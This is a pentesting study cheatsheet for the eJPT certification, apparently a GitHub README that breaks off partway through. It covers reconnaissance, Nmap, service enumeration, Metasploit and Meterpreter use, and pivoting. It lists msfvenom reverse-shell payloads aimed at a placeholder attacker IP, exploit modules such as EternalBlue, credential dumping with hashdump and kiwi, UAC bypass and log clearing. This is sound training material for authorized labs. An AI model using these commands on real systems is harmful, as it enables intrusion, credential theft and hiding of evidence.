<div align="center">

# 🛡️ eJPT Cheatsheet

### Guía práctica para la preparación del certificado Junior Penetration Tester

<p align="center">
  <img src="assets/images/ejpt-cheatsheet-cover.png" alt="eJPT Cheatsheet cover" width="850">
</p>

<p align="center">
  <img src="assets/images/ejpt-certification.png" alt="eJPT certification by Saúl Ruiz Plaza" width="850">
</p>

![Markdown](https://img.shields.io/badge/Markdown-000000?style=for-the-badge&logo=markdown&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Networking](https://img.shields.io/badge/Networking-0A66C2?style=for-the-badge)
![Pentesting](https://img.shields.io/badge/Pentesting-6f42c1?style=for-the-badge&logo=hackthebox&logoColor=white)
![eJPT](https://img.shields.io/badge/eJPT-Study_Notes-blueviolet?style=for-the-badge)

</div>

---

## 📌 Objetivo del repositorio

This repository contains a **personal cheatsheet for preparing for eJPT and controlled labs**. It is designed for quick consultation during a practice, but without limiting itself to standalone commands: each block explains **what it is for**, **when to use it**, and **what you should look at in the output**.

> [!IMPORTANT]
> All content is aimed at learning, CTFs, vulnerable machines, and environments where there is explicit authorization. Do not use these techniques against third-party systems without permission.

## 📚 Recursos del repositorio

- [Main cheatsheet](README.md): quick guide to commands, methodology, and techniques for eJPT labs.
- [Documentation template](LAB_TEMPLATE.md): professional structure for documenting machines, CTFs, and study labs.
- [eJPT exam template](EJPT_EXAM_TEMPLATE.md): structure for organizing hosts, evidence, credentials, pivoting, and answers during mock exams or exam-style labs.
- [Video about my eJPT exam experience](https://www.youtube.com/watch?v=31oboDFLCuc): personal explanation of the experience, preparation, and approach to the exam.

## 🎥 Vídeo: mi experiencia en el examen eJPT

In addition to this cheatsheet, I share my personal experience taking the eJPT exam on YouTube, with tips and important points for facing preparation with a clear methodology.

<p align="center">
  <a href="https://www.youtube.com/watch?v=31oboDFLCuc">
    <img src="https://img.youtube.com/vi/31oboDFLCuc/maxresdefault.jpg" alt="Video about my experience with the eJPT exam" width="850">
  </a>
</p>

📺 **Ver vídeo:** [Mi experiencia en el examen eJPT](https://www.youtube.com/watch?v=31oboDFLCuc)

## 🧭 Índice

- [Metodología de trabajo](#-metodología-de-trabajo)
- [Reconocimiento pasivo](#-reconocimiento-pasivo)
- [Google Dorking](#-google-dorking)
- [Descubrimiento y escaneo con Nmap](#-descubrimiento-y-escaneo-con-nmap)
- [Enumeración por servicio](#-enumeración-por-servicio)
- [Metasploit](#-metasploit)
- [Explotación web y servicios comunes](#-explotación-web-y-servicios-comunes)
- [Post-explotación Windows](#-post-explotación-windows)
- [Post-explotación Linux](#-post-explotación-linux)
- [Pivoting y movimiento en red](#-pivoting-y-movimiento-en-red)
- [Utilidades prácticas](#-utilidades-prácticas)
- [Plantilla de documentación](#-plantilla-de-documentación)

---

## 🧠 Metodología de trabajo

A good pentesting practice is not about firing tools at random. The recommended flow is:

| Phase | What you do | What you look for |
|---|---|---|
| Reconnaissance | Gather public or initial information | Domains, IPs, technologies, subdomains |
| Discovery | Identify active hosts | Live machines within the range |
| Enumeration | Analyze ports and services | Versions, users, routes, shared resources |
| Validation | Relate findings to real attack vectors | Weak credentials, CVEs, misconfigurations |
| Exploitation | Obtain controlled access | Shell, session, web access, credentials |
| Post-exploitation | Understand the compromised system | Users, permissions, internal network, secrets |
| Escalation | Look for higher-privilege paths | Sudo, SUID, services, tokens, credentials |
| Documentation | Record evidence | Commands, screenshots, results, and conclusions |

> [!TIP]
> In eJPT, it is often more important to enumerate well than to memorize exploits. Many times the path appears when you correlate services, versions, and reused credentials.



# 🔎 Passive reconnaissance

Passive reconnaissance aims to obtain information without interacting aggressively with the target. It helps create a first picture of the exposed surface.

## Comandos base

| Tool | Command | Practical use |
|---|---|---|
| `whatis` | `whatis nmap` | Quickly remember what a Linux tool does. |
| `host` | `host domain.com` | Resolve a domain and see associated addresses. |
| `whois` | `whois domain.com` | Check public information about the domain registry. |
| `whatweb` | `whatweb http://target` | Identify web technologies, server, CMS, or headers. |
| `dnsrecon` | `dnsrecon -d domain.com` | Enumerate DNS records, nameservers, and potentially useful data. |
| `wafw00f` | `wafw00f https://target` | Detect whether a web app is behind a WAF. |
| `sublist3r` | `sublist3r -d domain.com` | Search for subdomains using public sources. |

## Cómo interpretar resultados

- If `whatweb` detects a CMS, note the technology and version. It may guide later enumeration.
- If `dnsrecon` shows subdomains or interesting records, test them individually.
- If `wafw00f` detects a WAF, avoid noisy scans and document that requests may be filtered.
- If several domains or subdomains appear, create a list to use later with tools such as `httpx`, `ffuf`, `gobuster`, or `nmap`.

<details>
<summary><strong>📸 Passive reconnaissance screenshots</strong></summary>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-01.png" alt="Screenshot 1" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-02.png" alt="Screenshot 2" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-03.png" alt="Screenshot 3" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-04.png" alt="Screenshot 4" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-05.png" alt="Screenshot 5" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-06.png" alt="Screenshot 6" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-07.png" alt="Screenshot 7" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-08.png" alt="Screenshot 8" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-09.png" alt="Screenshot 9" width="850">
</p>

</details>




# 🌐 Google Dorking

Google Dorking allows you to find indexed information without directly interacting with the infrastructure. It is useful for discovering panels, documents, backups, or interesting routes.

| Operator | Example | What it provides |
|---|---|---|
| `site:` | `site:domain.com` | Limits results to a domain. |
| `site:*.` | `site:*.domain.com` | Searches for indexed subdomains. |
| `inurl:` | `site:domain.com inurl:admin` | Finds words inside URLs. |
| `intitle:` | `intitle:"index of"` | Searches for words in page titles. |
| `filetype:` | `site:domain.com filetype:pdf` | Finds specific documents. |
| `cache:` | `cache:domain.com` | Reviews cached versions when available. |
| quotes | `"admin login"` | Forces exact matches. |
| exclusion | `site:domain.com -www` | Removes terms from results. |

## Dorks útiles en laboratorios

```text
site:domain.com filetype:pdf
site:domain.com inurl:login
site:domain.com intitle:admin
site:*.domain.com
intitle:"index of" "backup"
inurl:config filetype:txt
```

> [!NOTE]
> The value of dorking is not in copying dorks, but in observing patterns, valid endpoints, and exposed information that can be used as a starting point for the rest of the enumeration.



# 🔍 Descubrimiento y escaneo con Nmap

Nmap is the core tool in most eJPT labs. It helps identify active hosts, discover the attack surface, and validate versions before exploitation.

## Flujo básico de escaneo

```bash
nmap -sS -sV -sC -p- IP
nmap -sU -sV IP
nmap -A -p- IP
nmap -T4 --min-rate 5000 -p- IP
```

## Qué revisar en la salida

| Item | Why it matters |
|---|---|
| Open ports | They usually correspond to exposed services. |
| Service/version banners | They indicate technologies and potential vulnerabilities. |
| Script results | They can expose misconfigurations, login pages, or SMB resources. |
| Host state | Up/down detection helps differentiate active hosts from unreachable ones. |

## Ejemplos útiles de escaneo

```bash
sudo nmap -sn 192.168.1.0/24
sudo nmap -sS -sV -O 192.168.1.10
sudo nmap -p- --open -T4 192.168.1.10 -oN nmap_scan.txt
```

> [!IMPORTANT]
> Do not limit yourself to checking only the most common ports. In eJPT, the value often lies in the less obvious ports: SMB, FTP, HTTP on non-standard ports, databases, and administrative services.

<details>
<summary><strong>📸 Nmap discovery and scanning screenshots</strong></summary>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-01.png" alt="Screenshot 1" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-02.png" alt="Screenshot 2" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-03.png" alt="Screenshot 3" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-04.png" alt="Screenshot 4" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-05.png" alt="Screenshot 5" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-06.png" alt="Screenshot 6" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-07.png" alt="Screenshot 7" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-08.png" alt="Screenshot 8" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-09.png" alt="Screenshot 9" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-10.png" alt="Screenshot 10" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-11.png" alt="Screenshot 11" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-12.png" alt="Screenshot 12" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-13.png" alt="Screenshot 13" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-14.png" alt="Screenshot 14" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-15.png" alt="Screenshot 15" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-16.png" alt="Screenshot 16" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-17.png" alt="Screenshot 17" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-18.png" alt="Screenshot 18" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-19.png" alt="Screenshot 19" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-20.png" alt="Screenshot 20" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-21.png" alt="Screenshot 21" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-22.png" alt="Screenshot 22" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-23.png" alt="Screenshot 23" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-24.png" alt="Screenshot 24" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-25.png" alt="Screenshot 25" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-26.png" alt="Screenshot 26" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-27.png" alt="Screenshot 27" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-28.png" alt="Screenshot 28" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-29.png" alt="Screenshot 29" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-30.png" alt="Screenshot 30" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-31.png" alt="Screenshot 31" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-32.png" alt="Screenshot 32" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-33.png" alt="Screenshot 33" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-34.png" alt="Screenshot 34" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-35.png" alt="Screenshot 35" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-36.png" alt="Screenshot 36" width="850">
</p>

</details>


# 🧩 Enumeración por servicio

After the scan, each open port should be treated as a lead. Enumeration must adapt to the service.

## HTTP / HTTPS

| Action | Command | What to check |
|---|---|---|
| Headers | `curl -I http://IP` | Server, technologies, redirects, cookies. |
| Web title | `nmap --script=http-title -p80 IP` | Identify the application or panel. |
| Directories | `gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` | Hidden routes, panels, backups. |
| Nikto | `nikto -h http://IP` | Misconfigurations and known findings. |
| WordPress | `wpscan --url http://IP --enumerate u,p,t` | Users, plugins, and themes. |

## SMB

```bash
smbclient -L //IP/ -N
smbclient //IP/share -N
smbmap -H IP
smbmap -H IP -u user -p password
nmap --script=smb-enum-shares,smb-enum-users -p445 IP
```

Look for anonymous resources, read/write permissions, usernames, configuration files, and reusable credentials.

## FTP

```bash
ftp IP
nmap --script=ftp-anon,ftp-syst -p21 IP
```

Check whether anonymous access exists, upload permissions, banners, and exposed files.

## SSH

```bash
ssh user@IP
nmap -sV -p22 IP
```

SSH is usually an access path rather than the initial vector. It is valuable if you find valid credentials, private keys, or password reuse.

## SMTP

```bash
nmap --script=smtp-commands,smtp-enum-users -p25 IP
nc -nv IP 25
```

It may allow user enumeration if the server responds to commands such as `VRFY` or `EXPN`.

## SNMP

```bash
snmpwalk -v2c -c public IP
nmap --script=snmp-info -sU -p161 IP
```

Misconfigured SNMP may reveal users, processes, network interfaces, routes, and installed software.

## NetBIOS

```bash
nbtscan IP
nmap --script=nbstat -sU -p137 IP
```

It can provide machine names, workgroups, and useful data for understanding a Windows environment.

<details>
<summary><strong>📸 Service enumeration screenshots</strong></summary>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-01.png" alt="Screenshot 46" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-02.png" alt="Screenshot 47" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-03.png" alt="Screenshot 48" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-04.png" alt="Screenshot 49" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-05.png" alt="Screenshot 50" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-06.png" alt="Screenshot 51" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-07.png" alt="Screenshot 52" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-08.png" alt="Screenshot 53" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-09.png" alt="Screenshot 54" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-10.png" alt="Screenshot 55" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-11.png" alt="Screenshot 56" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-12.png" alt="Screenshot 57" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-13.png" alt="Screenshot 58" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-14.png" alt="Screenshot 59" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-15.png" alt="Screenshot 60" width="850">
</p>

</details>




# 🚀 Metasploit

Metasploit helps search modules, configure options, validate services, run exploits, and perform post-exploitation in authorized labs.

## Flujo básico de trabajo en Metasploit

```bash
msfconsole
search service_name
use module
info
show options
show payloads
set RHOSTS IP
set RPORT PORT
set PAYLOAD payload
set LHOST ATTACKER_IP
set LPORT PORT
check
run
```

| Step | Use |
|---|---|
| `msfconsole` | Start the Metasploit Framework. |
| `search service_name` | Search modules by service, CVE, technology, or keyword. |
| `use module` | Select the module to use. |
| `info` | Review description, references, targets, and requirements. |
| `show options` | See mandatory parameters and configured values. |
| `show payloads` | List compatible payloads for the module. |
| `set RHOSTS IP` | Define the target. |
| `set RPORT PORT` | Define the service port. |
| `set PAYLOAD payload` | Choose a compatible payload for the system and architecture. |
| `set LHOST ATTACKER_IP` | Define the attacker's listening IP, typically the VPN IP. |
| `set LPORT PORT` | Define the listening port. |
| `check` | Test whether the target appears vulnerable, if the module supports it. |
| `run` | Execute the configured module. |

Before executing a module, confirm the version, operating system, port, and context using Nmap or another prior enumeration.

## Base de datos y workspaces

```bash
service postgresql start
msfconsole
db_status
workspace
workspace -a name
db_import scan.xml
db_nmap -sC -sV IP
hosts
services
vulns
```

The database allows organizing hosts, services, vulnerabilities, and scan results within Metasploit. Workspaces help separate labs or machines to avoid mixing evidence.

## Módulos auxiliares de escaneo

Auxiliary modules do not always exploit. Many times they are used to enumerate, validate credentials, discover information, or confirm the attack surface.

| Service | Module | Use |
|---|---|---|
| TCP | `auxiliary/scanner/portscan/tcp` | TCP scanning from Metasploit. |
| UDP | `auxiliary/scanner/discovery/udp_sweep` | UDP discovery. |
| FTP | `auxiliary/scanner/ftp/ftp_version` | Enumerate FTP version. |
| FTP | `auxiliary/scanner/ftp/anonymous` | Check anonymous FTP access. |
| FTP | `auxiliary/scanner/ftp/ftp_login` | Test FTP credentials. |
| SMB | `auxiliary/scanner/smb/smb_version` | Enumerate SMB version. |
| SMB | `auxiliary/scanner/smb/smb_enumusers` | Enumerate SMB users. |
| SMB | `auxiliary/scanner/smb/smb_enumshares` | Enumerate shared resources. |
| SMB | `auxiliary/scanner/smb/smb_login` | Test SMB credentials. |
| HTTP | `auxiliary/scanner/http/http_version` | Detect HTTP version. |
| HTTP | `auxiliary/scanner/http/http_header` | Obtain HTTP headers. |
| HTTP | `auxiliary/scanner/http/robots_txt` | Search `robots.txt`. |
| HTTP | `auxiliary/scanner/http/dir_scanner` | Enumerate directories. |
| HTTP | `auxiliary/scanner/http/files_dir` | Enumerate files. |
| HTTP | `auxiliary/scanner/http/http_login` | Test HTTP authentication. |
| MySQL | `auxiliary/scanner/mysql/mysql_version` | Enumerate MySQL version. |
| MySQL | `auxiliary/scanner/mysql/mysql_login` | Test MySQL credentials. |
| MySQL | `auxiliary/admin/mysql/mysql_enum` | Enumerate MySQL information. |
| MySQL | `auxiliary/admin/mysql/mysql_sql` | Run SQL queries. |
| MySQL | `auxiliary/scanner/mysql/mysql_schemadump` | Extract the database schema. |
| SSH | `auxiliary/scanner/ssh/ssh_version` | Enumerate SSH version. |
| SSH | `auxiliary/scanner/ssh/ssh_login` | Test SSH credentials. |
| SSH | `auxiliary/scanner/ssh/ssh_enumusers` | Enumerate SSH users. |
| SMTP | `auxiliary/scanner/smtp/smtp_version` | Enumerate SMTP version. |
| SMTP | `auxiliary/scanner/smtp/smtp_enum` | Enumerate SMTP users. |
| RDP | `auxiliary/scanner/rdp/rdp_scanner` | Check RDP. |
| WinRM | `auxiliary/scanner/winrm/winrm_login` | Test WinRM access. |

## Búsqueda de módulos

```bash
search type:auxiliary name:ftp
search type:auxiliary name:smb
search type:exploit platform:windows smb
search cve:2019-0708
search samba
search tomcat
```

Before using a module, review `info`, `show options`, the service version, the target system, and the available target. A module may exist but not apply to the exact version of the lab.

## Payloads y multi/handler

| Type | Use |
|---|---|
| Reverse | The target machine connects back to the attacker. Usually useful with NAT or VPN. |
| Bind | The target opens a port and the attacker connects to it. |
| Meterpreter | Advanced payload with post-exploitation functions, sessions, and file management. |

Basic listener:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
run
```

The handler payload must match the payload generated or executed on the laboratory machine.

## MSFvenom

```bash
msfvenom --list payloads
msfvenom --list formats
msfvenom --list encoders
```

Common examples:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell-x64.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw -o shell.php
```

| Option | Use |
|---|---|
| `-p` | Payload to generate. |
| `LHOST` | Attacker IP. |
| `LPORT` | Listening port. |
| `-f` | Output format. |
| `-o` | Output file. |
| `-a` | Architecture. |
| `-e` | Encoder. |
| `-i` | Encoder iterations. |
| `-x` | Template executable for injection. |
| `-k` | Try to preserve the original executable functionality. |

Encoders do not guarantee evasion. Use them only in lab environments, CTFs, or systems where you have explicit authorization.

## Resource scripts

```bash
msfconsole -r script.rc
resource /path/script.rc
makerc actions.rc
```

Example `.rc`:

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
run
```

Resource scripts automate repetitive Metasploit commands. They are useful for preparing listeners, importing scans, or reusing configurations.

## Meterpreter básico

| Command | Use |
|---|---|
| `sysinfo` | System information. |
| `getuid` | Current user. |
| `getprivs` | User privileges. |
| `pwd` | Current directory. |
| `ls` | List files. |
| `cd` | Change directory. |
| `download` | Download a file. |
| `upload` | Upload a file. |
| `shell` | Open a system shell. |
| `background` | Send the session to the background. |
| `sessions` | View sessions. |
| `sessions -i ID` | Interact with a session. |
| `hashdump` | Extract hashes if privileges allow. |
| `ps` | List processes. |
| `migrate PID` | Migrate to another process. |
| `clearev` | Clear logs in a lab. |

Post-exploitation actions should be limited to authorized labs and the evidence necessary for the exercise.

## Convertir shell a Meterpreter

```bash
use post/multi/manage/shell_to_meterpreter
set SESSION ID
set LHOST YOUR_IP
run
```

You can also try to upgrade a session with:

```bash
sessions -u ID
```

This is useful when you first get a simple shell and want a smoother interaction with Meterpreter.

## Módulos de explotación comunes en laboratorios

| Technique / Service | Module | Use |
|---|---|---|
| WebDAV IIS | `exploit/windows/iis/iis_webdav_upload_asp` | Upload ASP payload on vulnerable WebDAV. |
| ShellShock | `exploit/multi/http/apache_mod_cgi_bash_env_exec` | Exploit CGI vulnerable to ShellShock. |
| Tomcat | `exploit/multi/http/tomcat_jsp_upload_bypass` | Upload a JSP in vulnerable Tomcat. |
| Samba | `exploit/linux/samba/is_known_pipename` | Exploit vulnerable Samba on Linux. |
| MS17-010 | `exploit/windows/smb/ms17_010_eternalblue` | Exploit vulnerable SMBv1. |
| BlueKeep | `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` | Exploit vulnerable RDP in a lab. |
| WinRM | `exploit/windows/winrm/winrm_script_exec` | Remote execution via WinRM with credentials. |
| PsExec | `exploit/windows/smb/psexec` | Remote SMB access with credentials or hashes. |

Use these modules only if the version, operating system, architecture, and lab context match.

## Post-explotación Windows con Metasploit

| Module / Command | Use |
|---|---|
| `post/windows/gather/win_privs` | Review the user privileges. |
| `post/windows/gather/enum_logged_on_users` | Enumerate users with active sessions. |
| `post/windows/gather/checkvm` | Detect if the system is virtualized. |
| `post/windows/gather/enum_applications` | List installed applications. |
| `post/windows/gather/enum_av_excluded` | Review AV exclusions. |
| `post/windows/gather/enum_computers` | Enumerate visible machines. |
| `post/windows/gather/enum_patches` | Review installed patches. |
| `post/windows/gather/enum_shares` | Enumerate shared resources. |
| `post/windows/manage/enable_rdp` | Enable RDP in a lab, if applicable. |
| `post/windows/manage/archmigrate` | Migrate to a compatible architecture process. |
| `post/multi/recon/local_exploit_suggester` | Suggest possible local escalations. |
| `load kiwi` | Load the Kiwi extension in Meterpreter. |
| `creds_all` | Show credentials available in Kiwi. |
| `lsa_dump_sam` | Extract SAM if privileges allow. |
| `lsa_dump_secrets` | Extract LSA secrets if privileges allow. |

Credential dumping should only be done in authorized labs with a clear objective and proper documentation of the evidence.

## Bypass UAC e impersonación de tokens

```bash
getprivs
load incognito
list_tokens -u
impersonate_token "TOKEN"
```

Common lab module:

```bash
exploit/windows/local/bypassuac_injection
```

These techniques depend on privileges, architecture, available session, and system context.

## Post-explotación Linux con Metasploit

| Module | Use |
|---|---|
| `post/linux/gather/hashdump` | Try to extract hashes if privileges allow. |
| `post/multi/gather/env` | Collect environment variables. |
| `post/multi/gather/enum_network` | Enumerate network configuration. |
| `post/multi/gather/enum_protection` | Review protection mechanisms. |
| `post/multi/gather/enum_system` | Enumerate system information. |
| `post/multi/gather/checkvm` | Detect virtualization. |
| `post/multi/gather/enum_users_history` | Review user history. |
| `exploit/unix/local/chkrootkit` | Local escalation if the system is vulnerable. |

## Pivoting con Metasploit

```bash
ipconfig
route print
run autoroute -s INTERNAL_NETWORK/CIDR
background
use auxiliary/server/socks_proxy
set SRVPORT 9050
run
```

Port forwarding:

```bash
portfwd add -l LOCAL_PORT -p REMOTE_PORT -r INTERNAL_IP
```

| Technique | Use |
|---|---|
| `autoroute` | Adds a route to an internal network using a compromised session. |
| `socks_proxy` | Allows external tools to be used through `proxychains`. |
| `portfwd` | Allows access to an internal port from `localhost`. |


## Errores comunes

| Problem | Likely cause | Solution |
|---|---|---|
| Shell never arrives | Incorrect `LHOST` | Review the interface IP. |
| Exploit fails | Version is not vulnerable | Review the version and `info`. |
| Payload incompatible | Incorrect architecture | Use the correct x86/x64 payload. |
| Session unstable | Incorrect process | Migrate to a stable process. |
| Pivoting does not work | Route added incorrectly | Review `autoroute`, `proxychains`, and the internal network. |
| Handler receives no connection | Payload mismatch | Use the same payload in `msfvenom` and the handler. |
| The shell does not open even though everything seems correct | The exploit may fail temporarily or the handler may not be listening correctly | Re-run the exploit, restart the listener, and review connectivity between attacker and victim. |

<details>
<summary><strong>📸 Metasploit and modules screenshots</strong></summary>

<p align="center">
  <img src="assets/images/metasploit-step-01.png" alt="Screenshot 61" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-02.png" alt="Screenshot 62" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-03.png" alt="Screenshot 63" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-04.png" alt="Screenshot 64" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-05.png" alt="Screenshot 65" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-06.png" alt="Screenshot 66" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-07.png" alt="Screenshot 67" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-08.png" alt="Screenshot 68" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-09.png" alt="Screenshot 69" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-10.png" alt="Screenshot 70" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-11.png" alt="Screenshot 71" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-12.png" alt="Screenshot 72" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-13.png" alt="Screenshot 73" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-14.png" alt="Screenshot 74" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-15.png" alt="Screenshot 75" width="850">
</p>

</details>




# ⚔️ Explotación web y servicios comunes

This section gathers frequent vectors in eJPT labs. The goal is to know **what to check** and **what evidence to record**, not to launch exploits without criteria.

## WebDAV

```bash
davtest -url http://IP/webdav
cadaver http://IP/webdav
```

WebDAV can allow file uploads. If write and execution permissions are allowed, it may become an initial access path in vulnerable environments.

## Tomcat

```bash
nmap -sV -p8080 IP
```

In Tomcat, review admin panels, default credentials, old versions, and the possibility of deploying a WAR in vulnerable labs.

## Samba

```bash
smbclient -L //IP/ -N
smbmap -H IP
searchsploit samba
```

Samba can expose shared resources, weak configurations, or vulnerable versions. Enumeration is key before trying exploitation.

## WinRM

```bash
crackmapexec winrm IP -u user -p password
evil-winrm -i IP -u user -p password
```

WinRM allows remote access on Windows when valid credentials are present. It is very common in labs with reused usernames and passwords.

## RDP

```bash
nmap -sV -p3389 IP
xfreerdp /u:user /p:password /v:IP
```

RDP is used for graphical access. Check if the port is open, whether valid credentials exist, and whether the user has permission to log in.

## ShellShock

ShellShock affects Bash in certain CGI configurations. In labs, it often appears on old web paths or exposed CGI scripts.

```bash
nmap --script=http-shellshock --script-args uri=/cgi-bin/status -p80 IP
```

## MSFvenom

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe
```

MSFvenom generates payloads for labs. You must adjust the architecture, operating system, format, and return address.

<details>
<summary><strong>📸 Web exploitation and service screenshots</strong></summary>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-01.png" alt="Screenshot 76" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-02.png" alt="Screenshot 77" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-03.png" alt="Screenshot 78" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-04.png" alt="Screenshot 79" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-05.png" alt="Screenshot 80" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-06.png" alt="Screenshot 81" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-07.png" alt="Screenshot 82" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-08.png" alt="Screenshot 83" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-09.png" alt="Screenshot 84" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-10.png" alt="Screenshot 85" width="850">
</p>
